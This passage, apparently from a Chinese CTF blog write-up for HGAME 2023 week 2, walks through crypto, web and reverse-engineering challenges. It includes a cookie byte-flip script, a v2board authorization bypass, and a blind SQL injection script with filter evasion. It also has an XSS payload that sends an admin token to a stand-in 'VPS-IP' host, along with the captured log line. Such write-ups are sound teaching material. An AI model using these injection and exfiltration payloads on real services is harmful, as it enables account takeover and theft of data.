class="subst">&#123;k&#125;</span>75UtdWR6yUOD2rbYBBnIFPp1Rl/HXFxRPBwNeTzi2R2Wm5AVZQRwt+A==&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://week-2.hgame.lwsec.cn:30036/buy?prod=firecracker&#x27;</span></span><br><span class="line">    r = s.get(url, cookies=&#123;<span class="string">&#x27;token&#x27;</span>:quote(token)&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Vidar-Tu&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(k,quote(token),r.text)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 6 NnL3arZc7tt%2Bezcky%2BB8fF675UtdWR6yUOD2rbYBBnIFPp1Rl/HXFxRPBwNeTzi2R2Wm5AVZQRwt%2BA%3D%3D Vidar-Tu buy firecracker successfully</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹cookieä¸­çš„tokenï¼Œè´­ä¹°flagï¼Œå¾—åˆ°flagï¼š<code>hgame&#123;5o_Eas9_6yte_flip_@t7ack_wi4h_4ES-CTR&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Git-Leakage"><a href="#Git-Leakage" class="headerlink" title="Git Leakage"></a>Git Leakage</h3><blockquote><p>ç”µè§†å‰§é‡Œçš„é»‘å®¢?çœŸæ­£çš„é»‘å®¢ï¼</p></blockquote><p>é¢˜ç›®å³æç¤ºï¼Œgitæ³„éœ²ã€‚</p><p>è®¿é—® <code>http://HOST:PORT/.git/</code>ï¼Œä½¿ç”¨wgetä¸‹è½½gitç›®å½•ï¼š</p><p><code>wget -r http://week-2.hgame.lwsec.cn:31765/.git/</code></p><p>è¿›å…¥ <code>.git/logs</code>ï¼Œä½¿ç”¨ <code>git reflog</code> æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯çš„æ‰€æœ‰æ“ä½œè®°å½•ï¼ˆåŒ…æ‹¬å·²ç»è¢«åˆ é™¤çš„ commit è®°å½•å’Œ reset çš„æ“ä½œï¼‰ï¼›</p><p>é€‰æ‹©éœ€è¦æŸ¥çœ‹çš„è®°å½•ï¼Œ<code>git show 1dd69e2</code> æ‹¿åˆ°flagï¼š<code>hgame&#123;Don&#39;t^put*Git-in_web_directory&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="v2board"><a href="#v2board" class="headerlink" title="v2board"></a>v2board</h3><blockquote><p>è¯·å°è¯•è·å–Adminç”¨æˆ·çš„è®¢é˜…é“¾æ¥ï¼Œflagæ ¼å¼ä¸ºhgame{adminç”¨æˆ·è®¢é˜…é“¾æ¥ä¸­çš„tokenå€¼}ã€‚</p></blockquote><p>v2boardå­˜åœ¨è¶Šæƒæ¼æ´ï¼Œå‚è€ƒ<a href="https://www.ctfiot.com/88960.html">v2boardè¶Šæƒæ¼æ´å¤ç°</a>ã€‚</p><p>é¦–å…ˆæ³¨å†Œä¸€ä¸ªæ™®é€šç”¨æˆ·è´¦å·ï¼Œç„¶åé€šè¿‡ <code>http://HOST:PORT/api/v1/passport/auth/login</code> æ¥å£ç™»å½•è¯¥è´¦å·ï¼Œä¼šè¿”å›ä¸€ä¸ª <code>auth_data</code> å€¼ï¼›</p><p>ç„¶åè®¿é—® <code>http://HOST:PORT/api/v1/user/login</code> æ¥å£ï¼Œå¹¶å°†ä¸Šè¿°è·å¾—çš„ <code>auth_data</code> ä½œä¸ºauthorizationå¤´å‘é€ï¼Œè®©æœåŠ¡å™¨å°†æ™®é€šç”¨æˆ·çš„Authorizationå¤´å†™å…¥ç¼“å­˜ä¸­ï¼›</p><p>æœ€ååªè¦å¸¦ä¸Šè¿™ä¸ªAuthorizationå¤´å³å¯è®¿é—®æ‰€æœ‰çš„ç®¡ç†å‘˜æ¥å£ã€‚</p><p>è®¿é—® <code>http://HOST:PORT/api/v1/admin/user/fetch?pageSize=10&amp;current=1</code>ï¼Œå¾—åˆ°flagï¼š<code>hgame&#123;39d580e71705f6abac9a414def74c466&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Search-Commodity"><a href="#Search-Commodity" class="headerlink" title="Search Commodity"></a>Search Commodity</h3><blockquote><p>R1esbyfeç»™å…”å…”å†™äº†ä¸€ä¸ªç®€æ˜“çš„æŸ¥è¯¢é¢æ¿ï¼Œåªéœ€è¦è¾“å…¥idæ•°å­—ï¼Œå°±å¯ä»¥æŸ¥åˆ°å…”å…”æœ€è¿‘ä¹°çš„ä¸œè¥¿ï¼ˆåŒ…æ‹¬å¹´è´§ï¼‰</p><p>R1esbyfe:â€é¢æ¿ç™»é™†ç”¨æˆ·åæ˜¯user01,å¯†ç â€¦â€¦å¿˜äº†ï¼Œåæ­£æ˜¯ä¸ªæ¯”è¾ƒå¥½çŒœçš„å¯†ç â€</p><p>è²Œä¼¼R1esbyfeè¿˜è—äº†ç‚¹æƒŠå–œï¼Œä½ èƒ½å¸®åŠ©å…”å…”æ‰¾åˆ°å®ƒå—ï¼Ÿ</p><p>(æ•°æ®åº“å¯åŠ¨éœ€è¦æ—¶é—´ï¼Œè‹¥å‡ºç°Internal Errorï¼Œéœ€è¦ç¨ç­‰ç‰‡åˆ»)</p><p>HINTS:</p><p>å¯†ç æ˜¯å¼±å¯†ç ï¼Œå¯ä»¥è‡ªå·±æ‰¾ä¸ªdictçˆ†ç ´ä¸€ä¸‹</p></blockquote><p>æ ¹æ®hintçŒœå¯†ç  <code>admin123</code>ï¼Œsqlæ³¨å…¥ï¼Œfuzzå‘ç°è¿‡æ»¤äº†ç©ºæ ¼ã€selectã€databaseã€orã€ç­‰å·ã€å¤§å°äºå·ç­‰å…³é”®å­—ã€‚å…³é”®å­—æ”¹å¤§å†™ï¼Œç­‰å·æ”¹ <code>regexp</code> ç»•è¿‡ã€‚</p><p>å¸ƒå°”ç›²æ³¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.digits+string.ascii_letters+<span class="string">&#x27;&#123;&#125;-_?!,&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://week-2.hgame.lwsec.cn:30685/search&#x27;</span></span><br><span class="line">now = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="comment">#sql = &#x27;SELECT(DATABASE())&#x27;</span></span><br><span class="line">        <span class="comment">#sql = &#x27;SELECT(group_concat(table_name))FROM(infOrmation_schema.tables)WHERE((table_schema)regexp(&quot;se4rch&quot;))&#x27;</span></span><br><span class="line">        <span class="comment">#sql = &#x27;SELECT(group_concat(column_name))FROM(infOrmation_schema.columns)WHERE((table_name)regexp(&quot;5ecret15here&quot;))&#x27;</span></span><br><span class="line">        sql = <span class="string">&#x27;SELECT(hex(f14gggg1shere))FROM(se4rch.5ecret15here)&#x27;</span></span><br><span class="line">        payload = <span class="string">f&quot;0^(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;))&quot;</span></span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;search_id&#x27;</span>:payload&#125;</span><br><span class="line">        cookie = &#123;<span class="string">&#x27;SESSION&#x27;</span>:<span class="string">&#x27;MTY3MzYyOTg3OXxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT18Znqyk--boNReiPrlLxxyJ0FrSzzwttTHP8L2NJy6KFg=&#x27;</span>&#125;</span><br><span class="line">        r = s.post(url,data=data,cookies=cookie)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;hard disk&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            now += j</span><br><span class="line">            <span class="built_in">print</span>(now)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># database: se4rch</span></span><br><span class="line"><span class="comment"># table: 5ecret15here,L1st,user1nf0</span></span><br><span class="line"><span class="comment"># column: f14gggg1shere</span></span><br><span class="line"><span class="comment"># 6867616d657b345f4d346e5f5748305f4b6e3077735f5765346b2d50347373573072645f416e645f53514c217d</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š<code>hgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Designer"><a href="#Designer" class="headerlink" title="Designer"></a>Designer</h3><blockquote><p>Come and design your button</p></blockquote><p>åœ¨ <code>index.js</code> ä¸­ <code>/button/share</code> è·¯ç”±ä¼šè°ƒç”¨ <code>/button/preview</code> è·¯ç”±ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/button/share&quot;</span>, auth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">    <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">executablePath</span>: <span class="string">&quot;/usr/bin/chromium&quot;</span>,</span><br><span class="line">    <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>]</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>()</span><br><span class="line">  <span class="keyword">const</span> query = querystring.<span class="title function_">encode</span>(req.<span class="property">body</span>)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://127.0.0.1:9090/button/preview?&#x27;</span> + query)</span><br><span class="line">  <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;jwt_token_here&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&quot;#button&quot;</span>)</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;admin will see it later&quot;</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/button/preview&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> blacklist = [</span><br><span class="line">    <span class="regexp">/on/i</span>, <span class="regexp">/localStorage/i</span>, <span class="regexp">/alert/</span>, <span class="regexp">/fetch/</span>, <span class="regexp">/XMLHttpRequest/</span>, <span class="regexp">/window/</span>, <span class="regexp">/location/</span>, <span class="regexp">/document/</span></span><br><span class="line">  ]</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> req.<span class="property">query</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> blacklist) &#123;</span><br><span class="line">      <span class="keyword">if</span> (item.<span class="title function_">test</span>(key.<span class="title function_">trim</span>()) || item.<span class="title function_">test</span>(req.<span class="property">query</span>[key].<span class="title function_">trim</span>())) &#123;</span><br><span class="line">        req.<span class="property">query</span>[key] = <span class="string">&quot;&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&quot;preview&quot;</span>, &#123; <span class="attr">data</span>: req.<span class="property">query</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>æµ‹è¯•å‘ç° <code>/button/preview</code> è·¯ç”±å­˜åœ¨XSSæ³¨å…¥ï¼Œå°è¯•XSSè¯·æ±‚ä¼ªé€ ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://127.0.0.1:9090/user/register&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;));</span><br><span class="line">url=<span class="string">&quot;http://VPS-IP/x.php?token=&quot;</span>+<span class="title class_">String</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line"><span class="keyword">var</span> xhr2=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr2.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,url,<span class="literal">false</span>);</span><br><span class="line">xhr2.<span class="title function_">send</span>(<span class="string">&quot;token&quot;</span>);</span><br></pre></td></tr></table></figure><p>adminç‚¹å‡»åï¼Œç”Ÿæˆæ­£ç¡®tokenï¼Œå‘é€åˆ°VPSçš„apacheæ—¥å¿—ä¸­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[16/Jan/2023:01:01:39 +0800] &quot;GET /x.php?token=&#123;%22token%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoiaGdhbWV7Yl9jNHJlX2FiMHV0X3Byb3AzcnQxdHlfaW5qRWN0aU9ufSIsImlhdCI6MTY3MzgwMjA5OX0.pthLzDWpdJf3vb1pEBZbAknqfCq90xpL4ntnE3wpKdY%22&#125; HTTP/1.1&quot; 200 416 &quot;http://127.0.0.1:9090/&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/109.0.5414.74 Safari/537.36&quot;</span><br></pre></td></tr></table></figure><p>è§£æjwtï¼Œå¾—åˆ°flagï¼š<code>hgame&#123;b_c4re_ab0ut_prop3rt1ty_injEctiOn&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="before-main"><a href="#before-main" class="headerlink" title="before_main"></a>before_main</h3><p>åœ¨ <code>sub_558AEC339229()</code> ä¸­ä½¿ç”¨ <code>ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL)</code>  æœºåˆ¶å°†base64ç è¡¨ä¿®æ”¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_558AEC339229</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = ptrace(PTRACE_TRACEME, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;qword_558AEC33C020, <span class="string">&quot;qaCpwYM2tO/RP0XeSZv8kLd6nfA7UHJ1No4gF5zr3VsBQbl9juhEGymc+WTxIiDK&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x636D79474568756A</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†è§£ç å³å¯ï¼Œflagï¼š<code>hgame&#123;s0meth1ng_run_befOre_m@in&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="stream"><a href="#stream" class="headerlink" title="stream"></a>stream</h3><blockquote><p>å…”å…”å‡æœŸå‰å­¦ä¹ äº†ç¼–ç¨‹ï¼Œä½ èƒ½çœ‹å‡ºæ¥ä»–å­¦çš„æ˜¯ä»€ä¹ˆè¯­è¨€å—</p></blockquote><p>pythonç¨‹åºé€†å‘ï¼Œä½¿ç”¨pyinstxtractorå°†exeè§£åŒ…å¾—åˆ° <code>stream.pyc</code> æ–‡ä»¶ï¼Œå†ç”¨uncompyle6åç¼–è¯‘ï¼Œå¾—åˆ°æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: stream.pyc (Python 3.8)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">key</span>):</span><br><span class="line">Warning: block stack <span class="keyword">is</span> <span class="keyword">not</span> empty!</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        tmp = s[i]</span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = tmp</span><br><span class="line">        i = j = <span class="number">0</span></span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">            tmp = s[i]</span><br><span class="line">            s[i] = s[j]</span><br><span class="line">            s[j] = tmp</span><br><span class="line">            data.append(s[(s[i] + s[j]) % <span class="number">256</span>])</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">Warning: block stack <span class="keyword">is</span> <span class="keyword">not</span> empty!</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(text, gen(key)):</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ k)</span><br><span class="line">        result = base64.b64encode(result.encode()).decode()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">text = <span class="built_in">input</span>(<span class="string">&#x27;Flag: &#x27;</span>)</span><br><span class="line">key = <span class="string">&#x27;As_we_do_as_you_know&#x27;</span></span><br><span class="line">enc = encrypt(text, key)</span><br><span class="line"><span class="keyword">if</span> enc == <span class="string">&#x27;wr3ClVcSw7nCmMOcHcKgacOtMkvDjxZ6asKWw4nChMK8IsK7KMOOasOrdgbDlx3DqcKqwr0hw701Ly57w63CtcOl&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;yes!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="literal">None</span>(<span class="string">&#x27;try again...&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¯†åˆ«ä¸ºRC4åŠ å¯†ç®—æ³•ï¼Œcyberchefè§£å‡ºflagï¼š<code>hgame&#123;python_reverse_is_easy_with_internet&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><blockquote><p>ç”±äºå…”å…”çš„å­¦æ ¡æå‰æ”¾å‡ï¼Œå¼€å­¦æ‰èƒ½æœŸæœ«è€ƒè¯•ï¼Œäºæ˜¯å…”å…”å¼€å§‹äº†ä»–çš„å¯’å‡æœŸæœ«å¤ä¹ ~</p></blockquote><p>å®é™…ä¸ºè§£éé½æ¬¡çº¿æ€§æ–¹ç¨‹ç»„ï¼ŒçŸ©é˜µä¹˜æ³•é€†è¿ç®—ï¼Œè¿™é‡Œä½¿ç”¨z3æ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = [<span class="number">126</span>, <span class="number">225</span>, <span class="number">62</span>, <span class="number">40</span>, <span class="number">216</span>, <span class="number">253</span>, <span class="number">20</span>, <span class="number">124</span>, <span class="number">232</span>, <span class="number">122</span>, <span class="number">62</span>, <span class="number">23</span>, <span class="number">100</span>, <span class="number">161</span>, <span class="number">36</span>, <span class="number">118</span>, <span class="number">21</span>, <span class="number">184</span>, <span class="number">26</span>, <span class="number">142</span>, <span class="number">59</span>, <span class="number">31</span>, <span class="number">186</span>, <span class="number">82</span>, <span class="number">79</span>]</span><br><span class="line">out = [<span class="number">0</span>] * <span class="built_in">len</span>(x)</span><br><span class="line">c = [<span class="number">63998</span>, <span class="number">33111</span>, <span class="number">67762</span>, <span class="number">54789</span>, <span class="number">61979</span>, <span class="number">69619</span>, <span class="number">37190</span>, <span class="number">70162</span>, <span class="number">53110</span>, <span class="number">68678</span>, <span class="number">63339</span>, <span class="number">30687</span>, <span class="number">66494</span>, <span class="number">50936</span>, <span class="number">60810</span>, <span class="number">48784</span>, <span class="number">30188</span>, <span class="number">60104</span>, <span class="number">44599</span>, <span class="number">52265</span>, <span class="number">43048</span>, <span class="number">23660</span>, <span class="number">43850</span>, <span class="number">33646</span>, <span class="number">44270</span>]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">f = [Int(<span class="string">f&#x27;f<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line">ff = f[:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            out[<span class="number">5</span>*i+j] += ff[<span class="number">5</span>*i+k] * x[<span class="number">5</span>*k+j]</span><br><span class="line">        s.add(out[<span class="number">5</span>*i+j] == c[<span class="number">5</span>*i+j])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line">m = s.model()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(m[f[i]].as_long())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;y0ur_m@th_1s_gO0d&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="VidarCamera"><a href="#VidarCamera" class="headerlink" title="VidarCamera"></a>VidarCamera</h3><blockquote><p>å…”å…”æœ€è¿‘åœ¨å­¦ä¹ Androidå¼€å‘ï¼Œè¿™æ˜¯ä»–æŠ„çš„ç›¸æœºç¨‹åº</p></blockquote><p>apkå†…å…³é”®ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span>[] m229encrypthkIa6DI(<span class="type">int</span>[] iArr) &#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span>[] m446constructorimpl = UIntArray.m446constructorimpl(<span class="number">4</span>);</span><br><span class="line">UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">0</span>, <span class="number">2233</span>);</span><br><span class="line">UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">1</span>, <span class="number">4455</span>);</span><br><span class="line">UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">2</span>, <span class="number">6677</span>);</span><br><span class="line">UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">3</span>, <span class="number">8899</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">i2</span> <span 